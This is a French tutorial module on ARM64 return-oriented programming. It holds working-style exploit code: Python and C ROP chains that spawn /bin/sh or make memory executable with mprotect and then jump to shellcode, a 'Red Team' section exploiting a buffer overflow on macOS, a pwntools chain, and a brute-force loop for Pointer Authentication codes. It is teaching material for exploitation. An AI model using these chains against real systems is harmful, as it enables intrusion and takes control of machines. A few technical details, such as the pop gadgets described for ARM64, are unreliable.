# 31 - ROP Chains ARM64

## ğŸ¯ Ce que tu vas apprendre

- Comprendre le ROP (Return-Oriented Programming) sur ARM64
- Construire des chaÃ®nes ROP pour bypasser W^X et DEP
- Exploiter les gadgets ARM64 spÃ©cifiques
- Contourner PAC (Pointer Authentication Codes) sur Apple Silicon
- Automatiser la recherche de gadgets avec des outils

## ğŸ“š ThÃ©orie

### Concept 1 : Return-Oriented Programming (ROP)

**C'est quoi ?**

Le ROP est une technique d'exploitation qui consiste Ã  **enchaÃ®ner des petits morceaux de code existant** (appelÃ©s "gadgets") pour exÃ©cuter du code arbitraire **sans injecter de nouveau code**.

**Pourquoi ?**

Les protections modernes empÃªchent l'exÃ©cution de code sur la stack ou la heap (W^X / DEP). Le ROP contourne cela en rÃ©utilisant du code dÃ©jÃ  prÃ©sent dans des sections exÃ©cutables.

**Comment ?**

On manipule la stack pour enchaÃ®ner des adresses de gadgets. Chaque gadget se termine par `RET` (ou `BR X30` sur ARM64), ce qui charge l'adresse suivante depuis la stack.

```ascii
STACK AVANT ROP :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Buffer[64]   â”‚
â”‚ ...          â”‚
â”‚ Saved FP     â”‚
â”‚ Saved LR     â”‚ â† Return address
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

STACK APRÃˆS OVERFLOW (ROP Chain) :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ "AAAA..." x64â”‚ â† Remplir buffer
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Gadget 1     â”‚ â† pop x0, ret
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Argument 1   â”‚ â† Valeur pour X0
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Gadget 2     â”‚ â† pop x1, ret
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Argument 2   â”‚ â† Valeur pour X1
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Gadget 3     â”‚ â† syscall
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Concept 2 : Gadgets ARM64

**C'est quoi ?**

Un gadget est une **sÃ©quence d'instructions terminÃ©e par un retour** (`RET`, `BR X30`, `LDR PC, [SP]`, etc.).

**Pourquoi c'est diffÃ©rent sur ARM64 ?**

ARM64 utilise une convention d'appel diffÃ©rente :
- Registres arguments : X0-X7
- Link Register : X30 (LR) contient l'adresse de retour
- `RET` = `BR X30` (saute Ã  l'adresse dans LR)
- Pas de `POP` direct : on utilise `LDP` (Load Pair)

**Comment trouver des gadgets ?**

On cherche des patterns comme :
```asm
ldp x29, x30, [sp], #16  ; Charge FP et LR depuis stack
ret                       ; Saute Ã  LR
```

### Concept 3 : PAC (Pointer Authentication Codes)

**C'est quoi ?**

PAC est une protection matÃ©rielle d'Apple Silicon qui **signe cryptographiquement** les pointeurs (notamment LR) pour dÃ©tecter leur corruption.

**Pourquoi c'est un problÃ¨me pour ROP ?**

Quand on Ã©crase LR sur la stack, la signature PAC devient invalide. Au moment du `RET`, le CPU vÃ©rifie la signature et plante si elle est incorrecte.

**Comment contourner ?**

1. **Gadgets non-PAC** : Certaines fonctions ne signent pas LR
2. **Leak PAC** : Si on peut lire la stack, on rÃ©cupÃ¨re la signature
3. **Brute force** : PAC utilise seulement 16 bits (~65k tentatives)
4. **Gadgets BR X** : Sauter vers un registre contrÃ´lable au lieu de LR

## ğŸ” Visualisation

```ascii
PRINCIPE DU ROP

Programme normal :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ fonction_a()â”‚
â”‚   ret       â”‚ â† Retourne Ã  l'appelant
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ main()      â”‚
â”‚   ...       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ROP Chain :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ gadget_1    â”‚
â”‚   pop x0    â”‚
â”‚   ret       â”‚ â† Charge adresse suivante depuis stack
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ gadget_2    â”‚
â”‚   pop x1    â”‚
â”‚   ret       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ gadget_3    â”‚
â”‚   svc #0x80 â”‚
â”‚   ret       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

GADGETS COURANTS ARM64

1. Charger registres :
   ldp x0, x1, [sp], #16
   ret

2. Appeler fonction :
   blr x8
   ret

3. Syscall :
   svc #0x80
   ret

4. Ã‰crire mÃ©moire :
   str x0, [x1]
   ret

5. ContrÃ´le de flux :
   br x2
   (pas de ret, saute directement)

BYPASS W^X AVEC ROP

Objectif : Appeler mprotect() pour rendre une page RWX

1. PrÃ©parer arguments :
   X0 = adresse page
   X1 = taille
   X2 = PROT_READ | PROT_WRITE | PROT_EXEC

2. Charger numÃ©ro syscall :
   X16 = 0x200004A (mprotect sur macOS)

3. ExÃ©cuter :
   svc #0x80

4. Sauter vers shellcode :
   br x9
```

## ğŸ’» Exemple pratique

### Exemple 1 : ROP Chain Simple (execve)

Construire une chaÃ®ne ROP pour exÃ©cuter `/bin/sh`.

```python
#!/usr/bin/env python3
import struct

# Adresses des gadgets (Ã  trouver avec ROPgadget ou radare2)
gadget_pop_x0_ret = 0x100001234
gadget_pop_x1_ret = 0x100001240
gadget_pop_x2_ret = 0x100001250
gadget_pop_x16_ret = 0x100001260
gadget_syscall_ret = 0x100001270

# Adresse de "/bin/sh" dans le binaire
binsh_addr = 0x100002000

# Construire la ROP chain
rop_chain = b""
rop_chain += struct.pack("<Q", gadget_pop_x0_ret)
rop_chain += struct.pack("<Q", binsh_addr)  # X0 = "/bin/sh"

rop_chain += struct.pack("<Q", gadget_pop_x1_ret)
rop_chain += struct.pack("<Q", 0)  # X1 = NULL (argv)

rop_chain += struct.pack("<Q", gadget_pop_x2_ret)
rop_chain += struct.pack("<Q", 0)  # X2 = NULL (envp)

rop_chain += struct.pack("<Q", gadget_pop_x16_ret)
rop_chain += struct.pack("<Q", 0x200003B)  # X16 = execve syscall

rop_chain += struct.pack("<Q", gadget_syscall_ret)

# Padding + ROP chain
padding = b"A" * 72
exploit = padding + rop_chain

print(exploit)
```

### Exemple 2 : Trouver des Gadgets

Utiliser `ROPgadget` pour extraire les gadgets d'un binaire ARM64.

```bash
# Installer ROPgadget
pip3 install ropgadget

# Chercher tous les gadgets
ROPgadget --binary ./programme --arch arm64

# Chercher gadgets spÃ©cifiques
ROPgadget --binary ./programme --only "ldp|ret"
ROPgadget --binary ./programme --string "/bin/sh"

# Avec radare2
r2 -A ./programme
[0x100000000]> /R ldp x29, x30
[0x100000000]> /R svc
```

**RÃ©sultat typique :**
```
0x0000000100001234 : ldp x29, x30, [sp], #0x10 ; ret
0x0000000100001248 : ldp x0, x1, [sp], #0x10 ; ret
0x000000010000125c : svc #0x80 ; ret
0x0000000100001270 : br x8
```

### Exemple 3 : ROP Chain avec mprotect()

Rendre une page RWX puis sauter vers du shellcode.

```c
#include <stdio.h>
#include <stdint.h>

// Adresses des gadgets (Ã  adapter)
#define GADGET_POP_X0_RET   0x100001000
#define GADGET_POP_X1_RET   0x100001010
#define GADGET_POP_X2_RET   0x100001020
#define GADGET_POP_X16_RET  0x100001030
#define GADGET_SYSCALL      0x100001040
#define GADGET_BR_X0        0x100001050

void build_rop_chain(uint64_t *rop, void *shellcode_addr) {
    int i = 0;

    // mprotect(shellcode_addr, 0x1000, PROT_READ|WRITE|EXEC)
    rop[i++] = GADGET_POP_X0_RET;
    rop[i++] = (uint64_t)shellcode_addr & ~0xFFF;  // Aligner sur page

    rop[i++] = GADGET_POP_X1_RET;
    rop[i++] = 0x1000;  // Taille

    rop[i++] = GADGET_POP_X2_RET;
    rop[i++] = 7;  // PROT_READ | PROT_WRITE | PROT_EXEC

    rop[i++] = GADGET_POP_X16_RET;
    rop[i++] = 0x200004A;  // mprotect syscall

    rop[i++] = GADGET_SYSCALL;

    // Sauter vers shellcode
    rop[i++] = GADGET_POP_X0_RET;
    rop[i++] = (uint64_t)shellcode_addr;

    rop[i++] = GADGET_BR_X0;
}
```

### Exemple 4 : Bypass PAC avec Gadgets Non-SignÃ©s

Chercher des fonctions qui n'utilisent pas PAC.

```bash
# DÃ©sassembler et chercher fonctions sans PACIBSP
objdump -d programme | grep -A5 "^[0-9a-f]* <"

# Fonctions avec PAC :
100001000 <main>:
100001000: pacibsp        ; â† Signe LR
100001004: stp x29, x30, [sp, #-16]!
...
1000010fc: ldp x29, x30, [sp], #16
100001100: retab          ; â† VÃ©rifie signature

# Fonctions SANS PAC (cibles pour ROP) :
100002000 <helper>:
100002000: stp x29, x30, [sp, #-16]!  ; â† Pas de PAC !
...
100002010: ldp x29, x30, [sp], #16
100002014: ret             ; â† RET normal, pas RETAB
```

## ğŸ¯ Application Red Team

### ScÃ©nario 1 : Exploit macOS avec ROP

Exploiter un buffer overflow sur macOS Sonoma (Apple Silicon).

```python
#!/usr/bin/env python3
import struct
import subprocess

# Trouver les gadgets dans /usr/lib/libSystem.B.dylib
# (bibliothÃ¨que toujours chargÃ©e)
LIBSYSTEM_BASE = 0x7ff800000000  # Ã€ leak via ASLR

# Gadgets (offsets depuis base)
GADGET_POP_X0 = LIBSYSTEM_BASE + 0x12340
GADGET_POP_X1 = LIBSYSTEM_BASE + 0x12350
GADGET_POP_X2 = LIBSYSTEM_BASE + 0x12360
GADGET_POP_X16 = LIBSYSTEM_BASE + 0x12370
GADGET_SVC = LIBSYSTEM_BASE + 0x12380

# String "/bin/sh" dans libSystem
BINSH = LIBSYSTEM_BASE + 0x50000

def p64(addr):
    return struct.pack("<Q", addr)

# Construire ROP chain
rop = b""
rop += p64(GADGET_POP_X0) + p64(BINSH)
rop += p64(GADGET_POP_X1) + p64(0)
rop += p64(GADGET_POP_X2) + p64(0)
rop += p64(GADGET_POP_X16) + p64(0x200003B)
rop += p64(GADGET_SVC)

payload = b"A" * 72 + rop

# Exploiter
subprocess.run(["./vulnerable", payload])
```

### ScÃ©nario 2 : ROP AutomatisÃ© avec pwntools

```python
#!/usr/bin/env python3
from pwn import *

# Charger le binaire
elf = ELF('./vulnerable')
rop = ROP(elf)

# Construire automatiquement la chaÃ®ne
rop.call('mprotect', [elf.bss(), 0x1000, 7])
rop.call(elf.bss())  # Sauter vers shellcode

# GÃ©nÃ©rer payload
payload = flat({
    72: rop.chain()
})

# Envoyer
p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

### ScÃ©nario 3 : Bruteforce PAC

Exploiter la faible entropie de PAC (16 bits).

```python
#!/usr/bin/env python3
import struct

def bruteforce_pac(base_addr):
    """
    PAC utilise 16 bits hauts du pointeur.
    On peut tenter ~65k combinaisons.
    """
    for pac_bits in range(0x10000):
        # Construire adresse avec PAC
        addr = base_addr | (pac_bits << 48)

        # Tester (le programme crash ou rÃ©ussit)
        payload = struct.pack("<Q", addr)

        try:
            # Envoyer exploit
            result = exploit_with_address(payload)
            if result:
                print(f"PAC trouvÃ© : {pac_bits:04x}")
                return addr
        except:
            continue

    return None

# Lancer le bruteforce
leaked_addr = 0x0000100001234  # Adresse sans PAC
full_addr = bruteforce_pac(leaked_addr)
```

## ğŸ“ Points clÃ©s

1. **ROP = rÃ©utiliser du code existant** pour contourner W^X/DEP
2. **Gadgets ARM64** : chercher `ldp x29, x30, [sp], #16 ; ret`
3. **PAC sur Apple Silicon** : protÃ¨ge LR, mais peut Ãªtre contournÃ©
4. **Outils** : ROPgadget, radare2, pwntools pour automatiser
5. **Cibles** : libc, libSystem.dylib (toujours chargÃ©es en mÃ©moire)
6. **Techniques** : leak ASLR, bruteforce PAC, gadgets non-signÃ©s

## â¡ï¸ Prochaine Ã©tape

Module 32 : **Processus et Threads Windows** - Comprendre l'architecture des processus Windows pour l'exploitation et l'injection de code.
